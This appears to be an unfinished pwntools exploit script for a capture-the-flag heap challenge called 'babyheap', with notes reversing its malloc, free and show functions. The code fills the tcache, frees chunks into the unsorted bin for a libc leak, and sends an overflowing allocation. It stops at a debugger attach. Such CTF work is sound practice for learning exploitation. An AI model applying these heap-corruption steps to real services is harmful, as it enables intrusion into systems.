#!/usr/bin/env python3

from pwn import *

exe = ELF("./babyheap")
libc = ELF("./libc.so")
ld = ELF("./ld-2.29.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    def malloc(size, content):
    	r.sendline("M")
    	r.sendline(str(size))
    	r.send(content)

    def free(idx):
    	r.sendline("F")
    	r.sendline(str(idx))

    def show(idx):
    	r.sendline("S")
    	r.sendline(str(idx))

    # infoleak

    [malloc(0xf8, "\n") for i in range(7)] # idx 0-6
    malloc(0xf8, "\n") # idx 7, smallbin
    malloc(0xf8, "\n") # idx 8
    malloc(0xf8, "\n") # idx 9, smallbin - to seperate from wilderness

    [free(i) for i in range(7)] # free idx 0-6; ; fill tcache binlist
    free(7) # free idx 7, get chunk in unsorted bin
    free(8)

    [malloc(0xf8, "A"*0xf8 + "\n") for i in range(7)] # idx 0-6
    gdb.attach(r)
    malloc(0x8, "A"*0xa + "\n")
    #malloc(0x8, "A"*0x8 + "\n")
    r.interactive()


if __name__ == "__main__":
    main()
'''
reuses indexes
starts from 0x100 alloc
clears heap pointers -> no double free
heap pointers are stored in .bss

malloc:
	10 chunks limit
	heap pointer &DAT_00104060; size &DAT_00104068
	can allocate without content (\n or \x00)
	still uses  our original size for nr of bytes to read ?????
	if ((size & 0xffffffff) < 0xf9)
		malloc(0xf8) 0x101 248
	else
		malloc(0x178) 0x181 376

	zeroes everything?????????

free:
	memsets the whole chunk with 0
	erases heap pointer and size

show:
	calls puts function - info leak no restriction
'''